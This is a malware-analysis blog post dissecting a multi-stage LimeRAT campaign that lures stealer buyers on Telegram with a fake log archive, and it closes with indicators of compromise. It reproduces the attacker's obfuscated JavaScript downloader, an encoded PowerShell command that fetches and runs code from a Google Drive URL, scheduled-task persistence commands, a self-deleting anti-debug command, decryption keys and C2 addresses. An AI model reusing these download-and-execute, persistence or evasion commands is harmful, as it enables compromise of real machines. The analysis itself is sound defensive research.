---
layout: post
title: LimeRAT Malware Is Used For Targeting Unskilled Threat Actors
date: 2022-12-13 04:25:00
categories: [malware-analysis]
tags: [limerat]
class: post-template
redirect_from:
    - /2022-12-12-limerat-infecting-unskilled-threat-actors/
    - /posts/limerat-infecting-unskilled-threat-actors/
---

## Summary

I received a message on Telegram from an individual as a lure for executing a malicious script that downloads and executes additional obfuscated payloads (some of them directly in the memory) that achieve persistence in the victim’s machine. The disguise chosen was a supposed collection of files exfiltrated from infected computers via RedLine Stealer, a malware-as-a-service threat very popular among threat actors. 

After analyzing the final-stage payload, it was possible to identify it as a custom variant of the .NET LimeRAT, an open-source Remote Administration Tool publicly available (on [Github](https://github.com/NYAN-x-CAT/Lime-RAT/)) since at least February 2018.
<br /><br />

## 1. Introduction

In July 2022, an individual (handle **@sqcrxti0n**) approached me on Telegram by sending a message written in the Russian language along with an attached compressed file (**wallets-sorted.rar**):
<br />
  
![Screenshot from 2022-07-25 14-46-34.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_14-46-34.png)
_Figure 1. Telegram Message_
<br />
Message:

> Привeт.чeкнeшь лoги?oтдeльнo wallets coбрaл.ceгoдняшниe. трaф cвoй лью c гyглa,фб

The message asks for checking logs — related to some collected “wallets” — inside a compressed file. Additionally, it says that the traffic was supposedly obtained from Google and Facebook (if the translation is correct):

![Screenshot from 2022-07-25 20-04-19.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_20-04-19.png)
_Figure 2. Message translation_
<br />
Taking a look at the file, here are some details about it:

* **File name:** wallets-sorted.rar
* **MD5:** 15537cbd82c7bfa8314a30ddf3a4a092
* **SHA256:** 68e070e00f9cb3eb6311b29d612b9cf6889ce9d78f353f60aa1334285548df85

After extraction, it shows a lot of folders named with `“US” + [a unique ID] + [a time stamp]`:

![Screenshot from 2022-07-25 15-00-55.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-00-55.png)
_Figure 3. wallets-sorted.rar structure_
<br />
Each folder contains a bunch of fake text files, logs, cookies, supposed cryptocurrency wallets, and more:

![Screenshot from 2022-07-25 15-01-06.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-01-06.png)
_Figure 4. Fake files_
<br />

As an example, the image below shows one of the text files which is related to the RedLine stealer threat:

![Screenshot from 2022-07-25 15-07-44.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-07-44.png)
_Figure 5. RedLine Stealer fake log_
<br />
As a malware analyst, I once visited a group of Information stealer malware for sale on Telegram for research purposes **(I swear)**. So, I believe they got my Telegram account from there.

Some of the folders have the same JS file on them (same hash) but with different names:

![Screenshot from 2022-07-25 15-01-37.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-01-37.png)
_Figure 6. Folder containing suspicious files_
<br />
And the Microsoft Word (.docx) files shown above contain only plain text strings on them:

![Screenshot from 2022-07-25 15-05-03.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-05-03.png)
_Figure 7. Fake .docx files contain plain text_

Finally, the JS files contain an obfuscated and malicious script downloader which needs to be executed to start the attack.
<br /><br />

## 2. Downloader

Now that we know that the JS file is malicious, let’s start the analysis.

File details:

* **File name:** Meta.js
* **MD5:** 202622bcb60388ad2c74981b03763d5d
* **SHA256:** 8ac98edab8a8a2e5b9feeb6c28b2a27b6258d557c0105f087aeeaea995aee2d3
* **Content:**
![Malicious script content](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_172238.png)
_Figure 8. Malicious JS file content_
<br />

After sanitizing the file, we can see better the malicious code:
```javascript
newActiveXObject("shElL.APPLICatION").ShElLeXECutE(
    "cmd.eXe","Cmd /c cmd /C EcHO POwERsHEll -Ec aQBFAFgAKAAoAG4AZQBXAC0ATwBiAEoARQBDAFQAIAAJAAkACQAgACAACQAgACAAIAAJACAAIAAJACAAIAAJAAkAIAAJACAACQAgACAAIAAgACAAIAAJAG4AZQB0AC4AdwBFAGIAYwBsAEkAZQBOAHQAKQAuAEQAbwB3AG4AbABPAEEARABTAFQAUgBpAE4ARwAoACcAaAB0AHQAcABzADoALwAvAGQAcgBpAHYAZQAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwB1AGMAPwBpAGQAPQAxAGMAcQBRAGsAUgB1AFMAWABCAEsAcAByAGIAZQBfAGsAOQB0ADcAZwA3AGQATwBPADQAdgA3AEkAdgBXAG0ANgAmAGUAeABwAG8AcgB0AD0AZABvAHcAbgBsAG8AYQBkACcAKQApAA== > %LOCALAPPDATA%\CU666rZi4UOVMoxz6c01t32uua51pznD9fw1Sc7r73Hc4cPU80Ysaj813h6RPH3M.png:OvP4k5Q2Q6Y1AT9mrj1U6eehRxudHKrIAPC9UxQ83pP4iuoP54G7PSeBxy02aJ11.avi & cmD- < %LOCALAPPDATA%\CU666rZi4UOVMoxz6c01t32uua51pznD9fw1Sc7r73Hc4cPU80Ysaj813h6RPH3M.png:OvP4k5Q2Q6Y1AT9mrj1U6eehRxudHKrIAPC9UxQ83pP4iuoP54G7PSeBxy02aJ11.avi","","",0
);
```

Once double-clicked by the victim, it will run as follows:

1\. Gets executed via the command line:

> ```"C:\Windows\System32\WScript.exe" "C:\Users\%username%\Downloads\wallets-sorted\US[1F92332B4E490152BBA08692ABB682A4] [2022-07-25T00_13_52.6672057]\FileGrabber\Users\Administrator\Desktop\Meta.js”```{: .filepath }

2\. The resulting command will invoke three cmd.exe processes and write a shell command into a “.avi” file. It then executes another cmd.exe process that executes that file:

> ```"C:\Windows\System32\cmd.exe" Cmd 	     	 	 		 		  	 			  	 	  	  			/c    	    		 						 	 	cmd 	 	 	  	     										 		  				 		 			 	 	 	 				/C   			      					 				 		   	  EcHO 	  	    		 		  		    	  				   			POwERsHEll 	 	 		  	  					   	 	 		 						 	 	 	   			   	 	 		  		 -Ec aQBFAFgAKAAoAG4AZQBXAC0ATwBiAEoARQBDAFQAIAAJAAkACQAgACAACQAgACAAIAAJACAAIAAJACAAIAAJAAkAIAAJACAACQAgACAAIAAgACAAIAAJAG4AZQB0AC4AdwBFAGIAYwBsAEkAZQBOAHQAKQAuAEQAbwB3AG4AbABPAEEARABTAFQAUgBpAE4ARwAoACcAaAB0AHQAcABzADoALwAvAGQAcgBpAHYAZQAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwB1AGMAPwBpAGQAPQAxAGMAcQBRAGsAUgB1AFMAWABCAEsAcAByAGIAZQBfAGsAOQB0ADcAZwA3AGQATwBPADQAdgA3AEkAdgBXAG0ANgAmAGUAeABwAG8AcgB0AD0AZABvAHcAbgBsAG8AYQBkACcAKQApAA==   	   	  	 		  			   			  	 	   	     		  	>    	 	 				 			 	     					 			  			    				  	 			 	    	 	%LOCALAPPDATA%CU666rZi4UOVMoxz6c01t32uua51pznD9fw1Sc7r73Hc4cPU80Ysaj813h6RPH3M.png:OvP4k5Q2Q6Y1AT9mrj1U6eehRxudHKrIAPC9UxQ83pP4iuoP54G7PSeBxy02aJ11.avi 	 	      	 					 					   	 	     	    	& 	 			 				 	 				 		 	  		 		  			 	 							 			 		      		cmD 		 	 		 	   - 				 		 		 		     		  	  		 	      	  				 			   			   	 	 	 	<      	  		 	 		%LOCALAPPDATA%CU666rZi4UOVMoxz6c01t32uua51pznD9fw1Sc7r73Hc4cPU80Ysaj813h6RPH3M.png:OvP4k5Q2Q6Y1AT9mrj1U6eehRxudHKrIAPC9UxQ83pP4iuoP54G7PSeBxy02aJ11.avi```{: .filepath }

3\. The executed “.avi” file contains a command that invokes the powershell.exe process and executes a base64 encoded command

> ```POwERsHEll  	 	 		  	  					   	 	 		 						 	 	 	   			   	 	 		  		 -Ec aQBFAFgAKAAoAG4AZQBXAC0ATwBiAEoARQBDAFQAIAAJAAkACQAgACAACQAgACAAIAAJACAAIAAJACAAIAAJAAkAIAAJACAACQAgACAAIAAgACAAIAAJAG4AZQB0AC4AdwBFAGIAYwBsAEkAZQBOAHQAKQAuAEQAbwB3AG4AbABPAEEARABTAFQAUgBpAE4ARwAoACcAaAB0AHQAcABzADoALwAvAGQAcgBpAHYAZQAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwB1AGMAPwBpAGQAPQAxAGMAcQBRAGsAUgB1AFMAWABCAEsAcAByAGIAZQBfAGsAOQB0ADcAZwA3AGQATwBPADQAdgA3AEkAdgBXAG0ANgAmAGUAeABwAG8AcgB0AD0AZABvAHcAbgBsAG8AYQBkACcAKQApAA==```{: .filepath }

4\. The Base64-decoded command invokes another code downloaded as a string from a Google Drive URL:

> ```iEX((neW-ObJECT	net.wEbclIeNt).DownlOADSTRiNG('https://drive.google.com/uc?id=1cqQkRuSXBKprbe_k9t7g7dOO4v7IvWm6&export=download'))```{: .filepath }

The downloaded and executed code is a PowerShell script used in the next phase of the attack.
<br /><br />

## 3. Second-Stage Dropper

The downloaded code is named with the date from the day after I received the message:

* **File name:** 26.07.2022
* **MD5:** 8db6a8bc3bef287f02dc0b415218c128
* **SHA256:** b58200945412fbbc371dae652b800741f411183c14b50ce99b2d89675b2e9ae6
* **File Type:** Malicious Powershell script

The PowerShell script has a big Base64-encoded string that starts with “TVq”, which is transformed to “MZ” after decoding. Therefore, the string is a Base64-encoded Microsoft Windows PE file.

![Screenshot from 2022-07-25 15-30-11.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-30-11.png)
_Figure 9. Malicious PowerShell script downloaded_
<br />

At the end of the script, the string is decoded, copied to a file, and the PE file is then executed:

![Screenshot from 2022-07-25 15-32-50.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_15-32-50.png)
_Figure 10. End of the PowerShell script_
<br />

## 4. Third-Stage Loader

The PE is a VB.NET file with the following details:

* **File Type:** PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
* **MD5:** 8fe7e2573a12bee9cdb2b7fd4939987f
* **SHA256:** d8ecd0a1103834cee76de4c9bd90738ebe05fa46f116ebce591d3ef1ea97418e
* **Observation:** It decrypts and executes a payload directly into memory

The decompiled code contains some interesting strings in its metadata:

![Screenshot from 2022-07-25 19-22-26.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-22-26.png)
_Figure 11. .NET PE decompiled code using the DnSPY tool_
<br />

The PE’s resources have a lot of files containing **encrypted strings, from P0 to P31**. Additionally and curiously, it has some photos like below (The United Nations Secretary-General António Guterres and the President of Turkey, Tayyip Erdoğan) and two photos of a car and a house burning during the fire in Yosemite, California, U.S:

![Screenshot from 2022-07-25 19-23-35.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-23-35.png)
_Figure 12. Malware's resource image #1_
<br />

![Screenshot from 2022-07-25 19-24-19.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-24-19.png)
_Figure 13. Malware's resource image #2_

The image above was originally [taken](https://www.businessinsider.com/photos-explosive-wildfire-on-yosemite-border-6000-told-to-evacuate-2022-7) by Justin Sullivan, during the fire in Yosemite, California.
<br /><br />

![Screenshot from 2022-07-25 19-24-32.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-24-32.png)
_Figure 14. Malware's resource image #3_

The image above was originally [taken](https://twitter.com/SwansonPhotog/status/1550733532112162816/photo/3) by a photographer (David Swanson) from Reuters, also during the fire in Yosemite, California.
<br />

Regarding its components, the malware has a lot of Forms to probably disguise itself as a legitimate application:

<div align="center">
    <img src="/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-26-10.png" />
</div>
_Figure 15. Malware's components_
<br />

The malicious behavior was inserted on **Form1**. When initialized, it **gets the encrypted strings from the resources** (P0 through P31) and stores them on variables with names mixed with different alphabets:

![Screenshot from 2022-07-25 19-27-09.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-27-09.png)
_Figure 16. Third-stage - Form 1_
<br />

Then, all the strings are concatenated into a class property (Line 55):

![Screenshot from 2022-07-25 19-27-28.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-27-28.png)
_Figure 17. Third-stage - Form 1 - Concatenated strings from its resources_
<br />

The resulting encrypted string has over 2 MB:

![Screenshot 2022-12-12 184647.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_184647.png)
_Figure 18. Encrypted payload_
<br />

When the program is executed, it runs the Form1 class, loading all its properties (including the concatenated encrypted strings), and runs a method called **NewMethod1** passing a decoded base64 string obtained after calling another method that receives the concatenated string and a string that is used to generate the decryption key.

![Screenshot from 2022-07-25 19-29-55.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-29-55.png)
_Figure 19. Payload being decrypted and loaded in the memory_
<br />

The **NewMethod1** simply returns an Assembly object:

![Screenshot from 2022-07-25 19-29-16.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_from_2022-07-25_19-29-16.png)
_Figure 20. NewMethod1_
<br />

And the method that receives the concatenated encrypted string and the key decrypts it using AES256, ECB mode:

![Screenshot 2022-12-12 182636.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_182636.png)
_Figure 21. Decryption function_
<br />

The string used to create the key is `BE14D8CB` and it is hardcoded in the file.

After computing the string’s MD5 hash, it gets different parts of its bytes and concatenates them to generate the key:

`F3D86A7EFF59314543A5018968E194F3D86A7EFF59314543A5018968E194BC00`

The decrypted payload (a VB.NET PE) is then executed directly into the memory and it has approximately 1.21 MB:

![Screenshot 2022-12-12 185553.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_185553.png)
_Figure 22. Decrypted payload (Fourth-stage dropper)_
<br />

## 5. Fourth-stage Dropper

The PE is a VB.NET file with the following details:

* **File Type:** PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
* **MD5:** d0601e4cdf5fcf7e48e82624bfccbbfa
* **SHA256:** 34e16f7c3e743f6d13854d0a8e066bdf64930556c4e6e8fa7c2bb812cc7f29f8

At this point, the attack starts to get more interesting.

This payload also has embedded resources like the previous one (Third Stage) but instead of many resources, it has only **two encrypted resources**:

![Screenshot 2022-12-12 190255.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_190255.png)
_Figure 23. Embedded resources_
<br />

When executed, the payload runs its main function:

![Screenshot 2022-12-12 190132.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_190132.png)
_Figure 24. Main function overview_
<br />

Now, let’s analyze what this code does.

1. Tries to connect to [https://www.microsoft.com/](https://www.microsoft.com/) and gets the content returned by the page.

2. Executes the first function named in the Chinese language:

![Screenshot 2022-12-12 193833.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_193833.png)
_Figure 25. First function_
<br />

This function starts three cmd.exe processes that run the **md** (short for makedir) command, creating three folders:
- `C:\ProgramData\KJeporters`
- `C:\ProgramData\Sormerprime\majority\Somewhat..`
- `C:\Users\Roger\AppData\Roaming\Adobe\Dontrolling\Wickremesinghe\UnconventionalIdentity..`

Then, it gets the first encrypted resource and uses the same AES 256 (ECB Mode) decryption mechanism as the Third-stage payload. However, it uses the following string to generate the key: `"希是人是太族首管的接金她”`. Next, the decrypted content is decoded using base64 and decompressed via GZIP. Finally, the resulting data is written in the file below:

`C:\ProgramData\KJeporters\notepad.exe`

![Screenshot 2022-12-12 195748.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_195748.png)
_Figure 26. Decrypted resource being written into a file_
<br />

> **Note:** The analysis of the file above can be found in this document in the **Fifth-Stage** section.
{: .prompt-info }

Next, it starts two cmd.exe processes:

![Screenshot 2022-12-12 200152.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_200152.png)
_Figure 27. Spawning two processes_
<br />

The resulting command lines are:

> ```"cmd" /c  bitsadmin /transfer  /download /priority high  "C:\ProgramData\KJeporters\\notepad.exe"  "C:\ProgramData\Sormerprime\majority\Somewhat..\\explorer"```{: .filepath }

> ```"cmd" /c   bitsadmin /transfer  /download /priority high  "C:\ProgramData\KJeporters\\notepad.exe"  %APPDATA%\\"Adobe\Dontrolling\Wickremesinghe\UnconventionalIdentity..\\conhost"```{: .filepath }

3\. Executes the second function named in the Chinese language.

This function first tries to connect to [https://www.forbes.com/](https://www.forbes.com/)

Next, it creates two folders:

- `C:\ProgramData\Psnflation`
- `C:\Users\%username%\AppData\Roaming\Microsoft\Padnesday\Weather\Kemonstrated..`

Then, it gets the remaining resource and does the same decryption and decompression process as the previous function but it saves into a different file without extension:

`C:\ProgramData\Psnflation\svchost`

> **Note:** The malware above is the same one written in `C:\ProgramData\KJeporters\notepad.exe`{: .filepath }. The only difference is the icon used by the file.
{: .prompt-info }

Next, it executes the following command line:

> ```"cmd" /c  bitsadmin /transfer  /download /priority high  "C:\ProgramData\Psnflation\\svchost"   %APPDATA%\\"Microsoft\Padnesday\Weather\Kemonstrated..\\mspaint"```{: .filepath }

And creates **scheduled tasks** that are executed every 1 hour:

> ```"cmd" /c powershell.exe -noexit  -ExecutionPolicy UnRestricted  -Windo 1  -windowstyle hidden -noprofile -Command  SCHTASKs  /create /f /sc minute /mo 60 /tn "HKeformerprime" /tr C:\Users\%username%\AppData\Roaming\Adobe\Dontrolling\Wickremesinghe\UnconventionalIdentity..\\conhost```{: .filepath }

> ```"cmd" /c powershell.exe -noexit  -ExecutionPolicy UnRestricted  -Windo 1  -windowstyle hidden -noprofile -Command  SCHTASKs  /create /f /sc minute /mo 60 /tn "Mtancehimself" /tr C:\Users\%username%\AppData\Roaming\Microsoft\Padnesday\Weather\Kemonstrated..\\mspaint```{: .filepath }

4\. Verifies if the program is already in execution by checking if a Mutex is already in use.

5\. Executes another function to achieve persistence.

This function changes the Windows registry by adding the value below into the `Shell` sub-key as a persistence mechanism:

![Screenshot 2022-12-12 204114.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_204114.png)
_Figure 28. Persistence mechanism #1_
<br />

Next, it also changes the value below to set a specific folder as the Windows Startup default folder, probably as a fallback in case the scheduled tasks don’t work:

![Screenshot 2022-12-12 204327.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_204327.png)
_Figure 29. Persistence mechanism #2_
<br />

Finally, it executes the command line below that hides the conhost file and deletes itself:

> ```cmd /c      attrib +s +h  ""Adobe\Dontrolling\Wickremesinghe\UnconventionalIdentity..\\conhost""  &  ping 1.1.1.1 -n 1 -w  & del ""C:\Users\%userpofile%\Desktop\decrypted-payload.bin""```{: .filepath }

Since the file that executed this payload into the memory is the Third-Stage Loader, it will instead delete that file from the disk instead of the “decrypted-payload.bin” shown in the command line above.

After that, it tries to execute another method that gets two resources to decrypt and execute them into the memory. However, those resources don’t exist in the Third-Stage PE file, raising an exception which is handled by a catch statement that does nothing.
<br /><br />

## 6. Fifth-Stage Loader

This malware is the one written at: 
- `C:\ProgramData\KJeporters\notepad.exe`
- `C:\ProgramData\Psnflation\svchost`

* Here are its details:
    * **File Type:** Microsoft Windows PE, 32-bits, VB.NET
    * **MD5:** 10a62030a349651386e0ef66ab7047b9
    * **SHA256:** d36f27c55246cdb3f96a386dd67e2ae2503d81d244b42c8fbefd4767832b0df4

This malware has the same structure as the Third-Stage Dropper, with the same images as resources but the encrypted strings were divided into 33 parts (from P0 to P33) instead of 31 like before.

![Screenshot 2022-12-12 211938.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_211938.png)
_Figure 30. Fifth-stage loader resources_
<br />

Since the Third-Stage malware was already analyzed before, we can focus on the final-stage payload that is decrypted and loaded into the memory the same way but using a different string for generating the key.
<br /><br />

## 7. Final Payload

* **MD5:** 5eb53fc58ac0d4b819a162c48898cf77
* **SHA256:** 25cd4aba6b2523b66e7c2fc30b2f573dd2e972ebee8da6c21b991bc8dbca8f36
* **Timestamp:** 2022-07-25 04:29:08
* **File Type:** Microsoft Windows PE, 32-bits, VB.NET

After decompiling the file, we can see that it’s obfuscated but this time there are no embedded resources:

![Screenshot 2022-12-12 220740.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_220740.png)
_Figure 31. Final-stage payload_
<br />

Then, the code execution happens as follows:

1. Creates a Mutex named **"GRUZ_TG_26.07.2022”**.
2. Checks a boolean property from a class that is set to false. Because of that, an anti-debugging function is **not** executed.
    - The anti-debugging function works like this though:
        1. Gets the value of the base64-encoded Registry key `System\CurrentControlSet\Services\Disk\Enum\` and checks if it contains any of the values below:
            - “vmware”
            - “qemu”
            - “XP”
        2. It tries to load the **“SbieDll.dll”** DLL using the **kernel32.dll** `LoadLibrary` function.
        3. Checks if the debugger is active/attached by calling `System.Debugger.IsLogging()` and `System.Debugger.IsAttached`.
        4. Checks if the `%windir%\vboxhook.dll` file exists.
        
        If it’s being debugged, it executes the base64-encoded (`Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=`) command `cmd.exe /c ping 0 -n 2 & del` that deletes itself from the disk and then terminates its execution.
        
        ![Screenshot 2022-12-12 225133.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_225133.png)
        _Figure 32. Final-stage payload's anti-debugging function_
        
3. Starts a thread that keeps trying to connect to "[https://twitter.com/](https://twitter.com/)"
4. Starts a second thread that tries to connect to "[https://www.instagram.com/](https://www.instagram.com/)"
5. Starts a third thread that runs indefinitely the malware’s TCP client. It receives network data and does several operations with it.
    - Decrypts the network data using the same mechanism (**AES256, ECB Mode**, and the string `“1q2w3e4r5t”` to generate the key) as the other payloads, splits the content by “`|'L'|`”, and saves the data into an array.
    - The first element of the array is compared to the strings `“!PSend”`, `“!P”`, `“!CAP”`, `“CPL”`, `“IPL”`, `“IPLM”`, and `"!PStart”`.
6. Starts a fourth thread that keeps checking if any of the following processes are running: 
    * vmtoolsd.exe
    * vm3dservice.exe
    * VMSrvc.exe
    * Vmwareuser.exe
    * VBoxTray.exe
    * taskmgr.exe
    * processhacker.exe
    * wireshark.exe
    * procexp.exe
    * procexp64.exe
    * procexp64a.exe
    * AnVir.exe
    * tcpview.exe
    * ProcessLasso.exe
    * SvieCtrl.exe
    * ProcessManager.exe
    * apateDNS.exe
    * netstat.exe
    * filemon.exe
    * Process-Explorer-X64.exe
    * ollydbg.exe
    * httpdebugger.exe
    * windbg.exe
7. Starts a fifth thread that tries to connect to "[https://www.microsoft.com/](https://www.microsoft.com/)"
8. Starts one last thread that calls a function that checks a value from the Windows Registry
    * Gets the entry “USB” from the Registry Key HKCU\Software\INFECTED_MACHINE_UNIQUE_ID
        * The unique ID is generated by using the machine’s ProcessorId, BIOS SerialNumber, BaseBoard SerialNumber, and the VideoController Name values.

After debugging the malware’s execution, I noticed that it frequently uses some properties from the class below:

![Screenshot 2022-12-12 220922.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-12_220922.png)
_Figure 33. Malware settings_
<br />

As we already know that the MD5 hash (97db1846570837fce6ff62a408f1c26a) of the string (1q2w3e4r5t) is used to build the key (**97DB1846570837FCE6FF62A408F1C297DB1846570837FCE6FF62A408F1C26A00**), we can decrypt all the strings found in the class above:

1. `EUYS1q8/PTPEPaGTlq0kYIqqJQcFWo8Dw8zcoMeN5g8=`
    - **Decrypted:** https://www.facebook.com
2. `opEOMI6losc4TmzstGIEAUTNI7b+AZ1yYlWyNrllh/QS68DSHf35FbaIuHluOvO+`
    - **Decrypted:** https://pastebin.com/raw/W51ty3Bw
    - **Content returned by the URL:** 185.66.84.202:3715
3. `ACTYEkqawgkzMJ4GTC+DvdRrSXPgcZPEWb90tnFvvlcG0LiwElg/+eh/wvk/XcNeEzfszi1NzJldWc7QauqerCZ+WRIpSw0BxawIVVZnXXcl1zS4c5osg0WnJlW0EaQu`
    - **Decrypted:** https://drive.google.com/uc?id=1Yf7N9ARxkPqWjSVI756_KfKW3rhL6Def&export=download
    - **Content returned by the URL:** GRUZ_29.05.2022.txt
    - **File content:** 94.23.6.32:39431%
4. `HfSbrJXsAuyBNCT6wGuJkmY7DrE5X7cfprQvEYs/jo6r3OlQhxafU46MmOLl351ieeDKaBZK5grc79XWusW2QkRRTPU/McTZIO5PMlxCCeQ=`
    - **Decrypted:** https://web.opendrive.com/api/v1/download/file.json/ODNfMzE3ODgwMDdf?inline=1
    - **Content returned by the URL:** 138.201.81.121:39431

You can find [here](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Hex','string':'97DB1846570837FCE6FF62A408F1C297DB1846570837FCE6FF62A408F1C26A00'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)From_Base64('A-Za-z0-9%2B/%3D',true,false/disabled)&input=SGZTYnJKWHNBdXlCTkNUNndHdUprbVk3RHJFNVg3Y2ZwclF2RVlzL2pvNnIzT2xRaHhhZlU0Nk1tT0xsMzUxaWVlREthQlpLNWdyYzc5WFd1c1cyUWtSUlRQVS9NY1RaSU81UE1seENDZVE9) the CyberChef recipe to decrypt the strings.

Now we know that this malware is probably a backdoor, a botnet, or a RAT.
<br /><br />

## 8. Malware Family Classification

After searching for specific IOCs and strings used by the malware stages during the attack, I found some interesting matches on GitHub pointing to the **LimeRAT** malware:

![Screenshot 2022-12-13 142926.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-13_142926.png)
_Figure 34. LimeRAT evidence_
<br />

LimeRAT is [developed](https://github.com/NYAN-x-CAT/Lime-RAT) in Visual Basic .NET and contains many built-in modules such as encrypted communication with its C2, spreading mechanism via USB drivers, anti-VM/analysis techniques, and many additional plugins such as ransomware capability, XMR (Monero) mining, DDoS attacks, Crypto Stealing (by changing the cryptocurrency wallet addresses on the clipboard), and many more:

![Screenshot 2022-12-13 143325.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-13_143325.png)
_Figure 35. LimeRAT open-source project on GitHub_
<br />

Moreover, looking at LimeRAT’s project, there is a class very similar to the settings we saw in the final-stage malware:

![Screenshot 2022-12-13 143507.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-13_143507.png)
_Figure 36. LimeRAT settings source-code_
<br />

The encryption/decryption process is exactly the same:

![Screenshot 2022-12-13 143832.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-13_143832.png)
_Figure 37. LimeRAT encryption/decryption code_
<br />

As well as the mechanism used for generating the unique ID:

![Screenshot 2022-12-13 144716.png](/assets/img/limerat-infecting-unskilled-threat-actors/Screenshot_2022-12-13_144716.png)
_Figure 38. LimeRAT UUID generation code_
<br />

Therefore, the threat actors reused LimeRAT’s publicly available code in different stages of the attack since it’s very modularized and easily customizable. They added obfuscation and disguised all payloads, adding legit actions such as connecting to Google, Twitter, etc. For the C2 communication, they added other legit hosts like GoogleDrive and OpenDrive as fallbacks to get the IP:PORT values.
<br /><br />

## Conclusion

This is an attack that targets people who purchase or are involved with the RedLine Stealer malware-as-a-service threat. The social engineering employed entices the victims with supposed exfiltrated data that will probably be opened by them, including the malicious script, resulting in the execution of the attack and ultimately launching the LimeRAT.

It was not possible to attribute this attack to any group, so the motivation is unknown. One possibility is that it can be strictly financially motivated, as the malware-as-a-service business is rapidly evolving and attracting inexperienced people that likely own cryptocurrency and will not call the authorities in case they are attacked — making them perfect targets. Additionally, the victims will not submit the decoy file on services like VirusTotal, resulting in a stealthier and more durable campaign.
<br /><br />

## IOCs (Indicators Of Compromise)

### Files

1. wallets-sorted.rar
    - MD5: 15537cbd82c7bfa8314a30ddf3a4a092
    - SHA256: 68e070e00f9cb3eb6311b29d612b9cf6889ce9d78f353f60aa1334285548df85
    - Description: Decoy file sent on Telegram
2. Meta.js
    - MD5: 202622bcb60388ad2c74981b03763d5d
    - SHA256: 8ac98edab8a8a2e5b9feeb6c28b2a27b6258d557c0105f087aeeaea995aee2d3
    - Description: Downloader
3. 26.07.2022
    - MD5: 8db6a8bc3bef287f02dc0b415218c128
    - SHA256: b58200945412fbbc371dae652b800741f411183c14b50ce99b2d89675b2e9ae6
    - Description: Malicious Powershell script/Second-Stage Dropper
4. Unnamed
    - MD5: 8fe7e2573a12bee9cdb2b7fd4939987f
    - SHA256: d8ecd0a1103834cee76de4c9bd90738ebe05fa46f116ebce591d3ef1ea97418e
    - Description: Third-Stage Loader
5. Unnamed
    - MD5: d0601e4cdf5fcf7e48e82624bfccbbfa
    - SHA256: 34e16f7c3e743f6d13854d0a8e066bdf64930556c4e6e8fa7c2bb812cc7f29f8
    - Description: Fourth-stage Dropper
6. notepad.exe or svchost
    - MD5: 10a62030a349651386e0ef66ab7047b9
    - SHA256: d36f27c55246cdb3f96a386dd67e2ae2503d81d244b42c8fbefd4767832b0df4
    - Description: Fifth-Stage Loader
7. Unnamed
    - MD5: 5eb53fc58ac0d4b819a162c48898cf77
    - SHA256: 25cd4aba6b2523b66e7c2fc30b2f573dd2e972ebee8da6c21b991bc8dbca8f36
    - Description: Final Payload, LimeRAT

### URLs

- https://drive.google.com/uc?id=1cqQkRuSXBKprbe_k9t7g7dOO4v7IvWm6&export=download
- https://pastebin.com/raw/W51ty3Bw
- https://drive.google.com/uc?id=1Yf7N9ARxkPqWjSVI756_KfKW3rhL6Def&export=download
- https://web.opendrive.com/api/v1/download/file.json/ODNfMzE3ODgwMDdf?inline=1

### C2 addresses (IP:PORT)

- 185.66.84.202:3715
- 94.23.6.32:39431
